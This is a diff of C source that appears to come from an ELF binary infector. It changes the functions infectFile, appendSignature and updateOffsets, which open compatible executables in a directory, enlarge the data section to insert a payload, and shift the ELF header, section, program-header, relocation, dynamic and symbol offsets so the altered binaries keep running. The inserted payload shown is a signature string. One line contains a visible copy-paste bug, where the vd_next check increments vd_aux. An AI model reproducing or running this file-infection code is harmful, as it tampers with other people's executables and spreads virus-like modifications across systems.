@@ -7,25 +7,25 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     Elf64_Shdr  *section;
     Elf64_Phdr  *program;
 
-    if (header->e_entry >= offset)
+    if (header->e_entry > offset)
       header->e_entry += toAdd;
-    if (header->e_phoff >= offset)
+    if (header->e_phoff > offset)
       header->e_phoff += toAdd;
-    if (header->e_shoff >= offset)
+    if (header->e_shoff > offset)
       header->e_shoff += toAdd;
     i = 0;
     while (i < header->e_shnum) {
         section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
-        if (section->sh_offset >= offset)
+        if (section->sh_offset > offset)
             section->sh_offset += toAdd;
-        if (section->sh_addr >= offset)
+        if (section->sh_addr > offset)
             section->sh_addr += toAdd;
         if (section->sh_type == SHT_REL) {
             Elf64_Rel *rel;
             size = 0;
             while (size < section->sh_size) {
               rel = ((void *)header) + section->sh_offset + (sizeof(Elf64_Rel) * (size / sizeof(Elf64_Rel)));
-              if (rel->r_offset >= offset)
+              if (rel->r_offset > offset)
                 rel->r_offset += toAdd;
               size += sizeof(Elf64_Rel);
             }
@@ -47,16 +47,16 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
             size = 0;
             while (size < section->sh_size) {
               dyn = ((void *)header) + section->sh_offset + (sizeof(Elf64_Dyn) * (size / sizeof(Elf64_Dyn)));
-              if (dyn->d_un.d_ptr >= offset)
+              if (dyn->d_un.d_ptr > offset)
                 dyn->d_un.d_ptr += toAdd;
               size += sizeof(Elf64_Dyn);
             }
         } else if (section->sh_type == SHT_GNU_verdef) {
             Elf64_Verdef  *verdef;
             verdef = ((void *)header) + section->sh_offset;
-            if (section->sh_offset < offset && verdef->vd_aux >= offset)
+            if (section->sh_offset < offset && verdef->vd_aux > offset)
               verdef->vd_aux += toAdd;
-            if (section->sh_offset < offset && verdef->vd_next >= offset)
+            if (section->sh_offset < offset && verdef->vd_next > offset)
               verdef->vd_aux += toAdd;
         } else if (section->sh_type == SHT_SYMTAB) {
           Elf64_Xword size;
@@ -64,7 +64,7 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
           size = 0;
           while (size < section->sh_size) {
             symbol = ((void *)header) + section->sh_offset + size;
-            if (symbol->st_value >= offset) {
+            if (symbol->st_value > offset) {
               symbol->st_value += toAdd;
             }
             size += sizeof(Elf64_Sym);
@@ -75,11 +75,11 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     i = 0;
     while (i < header->e_phnum) {
         program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
-        if (program->p_offset >= offset)
+        if (program->p_offset > offset)
             program->p_offset += toAdd;
-        if (program->p_vaddr >= offset)
+        if (program->p_vaddr > offset)
             program->p_vaddr += toAdd;
-        if (program->p_paddr >= offset)
+        if (program->p_paddr > offset)
             program->p_paddr += toAdd;
         i += 1;
     }
@@ -151,7 +151,7 @@ static int  writeToFile(const char *dirname, const char *filename, struct bfile 
   return (0);
 }
 
-static int  appendSignature(struct bfile file, Elf64_Shdr *dataHeader) {
+static int  appendSignature(struct bfile file, size_t offset) {
   size_t  i;
   void    *tmp;
   size_t  toAdd;
@@ -160,7 +160,7 @@ static int  appendSignature(struct bfile file, Elf64_Shdr *dataHeader) {
   i = file.size - 1;
   tmp = file.header;
   toAdd = strlen(payload) + 1;
-  total = file.size - (dataHeader->sh_offset + dataHeader->sh_size);
+  total = file.size - offset;
   memmove(tmp + i + toAdd - total, tmp + i - total, total);
   i -= total - 1;
   memcpy(tmp + i, payload, toAdd);
@@ -177,9 +177,10 @@ static int  infectFile(const char *dirname, struct dirent *file) {
     return (0);
   dprintf(1, "File %s is compatible\n", file->d_name);
   data = getDataSectionHeader(header.header);
+  data->sh_size += strlen(payload) + 1;
   size_t  offset;
   offset = data->sh_offset;
-  appendSignature(header, data);
+  appendSignature(header, offset + data->sh_size - strlen(payload) - 1);
   header.size += strlen(payload) + 1;
   dprintf(1, "Changed data name\n");
   updateOffsets(header.header, offset, strlen(payload) + 1);
